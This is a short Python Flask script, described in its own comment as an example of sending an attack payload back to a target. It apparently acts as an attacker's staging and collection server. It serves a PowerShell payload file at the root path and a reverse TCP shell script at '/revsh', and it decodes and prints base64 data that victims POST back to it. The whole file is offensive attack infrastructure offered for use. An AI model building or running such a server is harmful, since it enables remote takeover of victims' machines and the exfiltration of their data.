# This file gives an example of sending the attack payload back to the target

from flask import *
import base64
import sys

app = Flask('__main__')

def openFile(path, name):
	content = ''
	with open('%s\\%s'%(path, name), 'rt') as file:
		content = file.read()
	return content

@app.route('/', methods = ['POST', 'GET'])
def root():
	if request.method == 'POST':
		data = request.form.get('d')
		plain = base64.b64decode(data).decode('UTF-8')
		print plain
		return ''
	else:
		return openFile('.', 'payload.ps1')

@app.route('/revsh', methods = ['GET'])
def reverseShell():
	return openFile('.', 'reverse_tcp_shell.ps1')

if __name__ == '__main__':
	app.run(port = 80, debug = True)
